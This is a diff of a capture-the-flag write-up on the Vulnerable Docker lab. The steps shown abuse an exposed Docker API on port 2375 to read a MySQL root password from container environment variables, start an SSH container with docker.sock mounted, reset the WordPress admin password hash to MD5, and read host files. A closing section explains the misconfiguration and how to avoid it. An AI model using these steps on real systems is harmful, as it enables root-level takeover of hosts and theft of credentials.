@@ -44,7 +44,7 @@ Next, lets check this out.
 
 ## Checking what we're dealing with
 This is my first time with the docker API but I do know a little bit about docker and docker commands, so let see if we can get anything special - lets try to get a list of the containers. I used Postman to send HTTP requests:
-```bash
+```
 http://192.168.253.129:2375/containers/json
 ```
 And indeed, we get a list of the running containers inside the server:
@@ -60,9 +60,10 @@ We can now try to inspect each container to search for any interesting variables
 
 #### content_wordpress_1:
 
-```bash
+```
 http://192.168.253.129:2375/containers/content_wordpress_1/json
 ```
+
 ```javascript
 {
 ...
@@ -97,9 +98,10 @@ We'll get to the HostConfig shortly.
 
 #### content_db_1:
 
-```bash
+```
 http://192.168.253.129:2375/containers/content_db_1/json
 ```
+
 ```javascript
 {
 ...
@@ -119,9 +121,10 @@ Each mysql container needs to be initialized with root password, this variable i
 
 #### content_ssh_1:
 
-```bash
+```
 http://192.168.253.129:2375/containers/content_ssh_1/json
 ```
+
 ```javascript
 {
 ...
@@ -162,12 +165,12 @@ OK, we want to bind the SSH port so we can connect to the mysql container. But, 
 ## Let's get dirty
 The creattion and initiation of containers with the Docker API is quite easy - we just need to know what kind of container and what kind of environment variables we need. 
 
-The image of the SSH container is `jeroenpeeters/docker-ssh` - so we better read it's documentation and understand what is needed for it to work. You can find it [here](https://hub.docker.com/r/jeroenpeeters/docker-ssh/).
+The image of the SSH container is `jeroenpeeters/docker-ssh` - so we better read it's documentation and understand what is needed for it to work. You can find it over [here](https://hub.docker.com/r/jeroenpeeters/docker-ssh/).
 
 Long stroy short (although the long one is not so long):
 - The main idea of this container is to create a SSH connection to containers that does not come with one originally.
 - It doing so by using the EXEC docker command to open a bash in the target container and tunnel it to the SSH connection through the external port, outside.
-- In order to do so, the SSH container needs to initiated with the docker.sock mounted to it. Docker.sock is the socket which the docker deamon is listen to - to get commands.
+- In order to do so, the SSH container needs to be initiated with the docker.sock mounted to it. Docker.sock is the socket which the docker deamon is listen to - to get commands.
 - Mounting means that the socket itself (or whatever else you're mounting) is connected from the host machine directly to a  certain path in the container. This means that who ever have access to the container has access to the host machine. Later, we're going to use this feature to scan the host machine files.
 - We need to remember to bind some external ports to port 22 and port 8022 on the container - so we can connect to it.
 - The 8022 port is for a Web API - which is very nice feature of this image.
@@ -175,9 +178,10 @@ Long stroy short (although the long one is not so long):
 We know, more or less, what configuration we needs to connect the SSH container to the DB container. Now we need to look at the Docker API to see how we need to configure it. You can see that it is pretty straight forward:
 
 POST request to:
-```bash
+```
 http://192.168.253.129.98:2375/containers/create?name=content_ssh_2
 ```
+
 With body:
 ```javascript
 {
@@ -186,24 +190,24 @@ With body:
 	"Name" : "content_ssh_2",
 	
 	"HostConfig": {
-			"Binds": [
-				"/var/run/docker.sock:/var/run/docker.sock:rw",
-				"/usr/bin/docker:/usr/bin/docker:rw"
-				],
-            "PortBindings": {
-                "22/tcp": [
-                    {
-                        "HostIp": "0.0.0.0",
-                        "HostPort": "2220"
-                    }
-            	],
-				"8022/tcp": [
-                    {
-                        "HostIp": "0.0.0.0",
-                        "HostPort": "8822"
-                    }
-                ]
-            }
+		"Binds": [
+			"/var/run/docker.sock:/var/run/docker.sock:rw",
+			"/usr/bin/docker:/usr/bin/docker:rw"
+			],
+		"PortBindings": {
+			"22/tcp": [
+			    {
+				"HostIp": "0.0.0.0",
+				"HostPort": "2220"
+			    }
+			],
+					"8022/tcp": [
+			    {
+				"HostIp": "0.0.0.0",
+				"HostPort": "8822"
+			    }
+			]
+		    }
 	},
 	
 	"Env": [
@@ -219,6 +223,9 @@ With body:
 }
 ```
 
+Here, we ask docker to bind the host's port 2220 to port 22 of the `content_ssh_2` container, and host's port 8822 to port 8022. All the env. object is taken from the inspection of the docker-ssh container (except changing the name of the target container).
+
+
 Upon successful creation we will recieve the following response:
 ```javascript
 {
@@ -230,20 +237,21 @@ We can reference a container by its Id or by its name.
 
 After creating the container we need to start it, otherwise it's just an image sitting there, doing nothing but aging:
 POST request to:
-```bash
+```
 http://192.168.253.129:2375/containers/content_ssh_2/start
 ```
 Status 204 means everything went alright.
 
 Just to make sure we can check the containers list:
-```bash
+```
 http://192.168.253.129:2375/containers/json
 ```
 
 OK, and now we can test it:
-```bash
+```
 http://192.168.253.129:8822/
 ```
+
 And we should get:
 
 <center><img alt="content_db_1 ssh web API" src="files/images/db_1-ssh.png" /></center>
@@ -255,8 +263,8 @@ This is the web API for the ssh connection of the ssh image we're using. Let's t
 Enter password:
 ```
 
-As for the password we're using what we've got from the inspect of the db container: `Peaches123`. And it worked!
-```bash
+As for the password, we're using what we've got from the inspection of the db container: `Peaches123`. And it worked!
+```
 Welcome to the MySQL monitor.  Commands end with ; or \g.   
 Your MySQL connection id is 5
 Server version: 5.7.19 MySQL Community Server (GPL)
@@ -274,8 +282,8 @@ mysql>
 
 ## Finding the first flag
 
-Feel free to roam through the tables and databases - nothing too interesting except this table:
-```
+Feel free to roam through the tables and databases - nothing too interesting, except this table:
+```mysql
 mysql> select * from wordpress.wp_users;                                                                                                                                                                                                                                                  
 +----+------------+------------------------------------+---------------+----------------------------+----------+---------------------+---------------------+-------------+--------------+                                                                                                 
 | ID | user_login | user_pass                          | user_nicename | user_email                 | user_url | user_registered     | user_activation_key | user_status | display_name |                                                                                                 
@@ -287,21 +295,24 @@ mysql> select * from wordpress.wp_users;
 
 Which means that we could get into the wordpress account, if only we knew what hash we should put in the user_pass column.
 
-That required a little bit of research but: Wordpress, in the past, used MD5 hash algorithm but changed it - to make accounts more secure. But, for backward compatability, it's still checking, first, MD5 hash - if it finds that that's the case it gets you in but, on the way, change the hash to the more secure one.
+That required a little bit of a research but: Wordpress, in the past, used MD5 hash algorithm but eventualy changed it in order to make accounts more secure. But, for backward compatability, it's still checking for MD5 hash - if it finds that that's the case, it gets you in but, on the way, change the hash to the more secure one.
 
-For us - we only need to use MD5:
-```
+For us, it means - we only need to use MD5:
+
+```mysql
 mysql> UPDATE wordpress.wp_users SET user_pass=MD5("password") WHERE ID=1; 
 ```
 
 And that's it. We have access to the admin account of the site. 
 
 On wordpress, the login page is on: /wp-admin. Use `bob` as username and `password` as the password.
+
 ```
 http://192.168.253.129:8000/wp-admin/
 ```
 
-After accessing it, you can find immediatly the first flag `flag_1` under Drafts.
+After accessing it, you can find immediately the first flag `flag_1` under Drafts.
+
 ```
 2aa11783d05b6a329ffc4d2a1ce037f46162253e55d53764a6a7e998
 
@@ -314,7 +325,7 @@ hint: they are in files.
 
 We have some clue as to what to be looking for - a file. Easy, right?
 
-```
+```bash
 / $ find . -name *flag*
 ```
 
@@ -335,7 +346,7 @@ http://192.168.253.129:2375/containers/create?name=content_wordpress_2
 ```
 
 With body:
-```
+```javascript
 {
 	"Image": "wordpress",
 	
@@ -368,6 +379,7 @@ bin  boot  dev  etc  flag_3  home  initrd.img  lib  lib64  lost+found  media  mn
 ```
 
 And watch! We've found the second flag!
+
 ```bash
 /host-files $ cat flag_3
 d867a73c70770e73b65e6949dd074285dfdee80a8db333a7528390f6
@@ -387,3 +399,9 @@ on vulndocker@notsosecure.com
 ```
 
 ## Some conclusions
+
+The Root Of All Evil here was the docker.sock exposed to the world through port 2375. This is extremely a bad thing to do. Docker.sock is the socket which the docker deamon is listening to. Since the docker deamon is running as root - port 2375 has, effectively, root priviliges on the host machine - the CTF ended before it even began...
+
+The second bad habbit, and much more common, is mounting the docker.sock to the containers. If you'll try to solve the Hard mode \[SPOILER ALERT] - you can't use there the exposed port. So the point here is to try and get access to some container and realised that the docker.sock is mounted to it - and now, you have your root access to the host machine.
+
+Mounting the docker.sock to containers is common since there are plenty of things that you would want to achive with it: Being aware of other containers around, get access to their environment variables, communicate with dockerd (as with the docker-ssh container) etc. Nonetheless it is bad practice and you should always find workaround. One way is to isolate the process which is to communicate with dockerd on another container which is not accessible through the network (for example, look at this guy suggestion: https://github.com/containous/traefik/issues/4174).
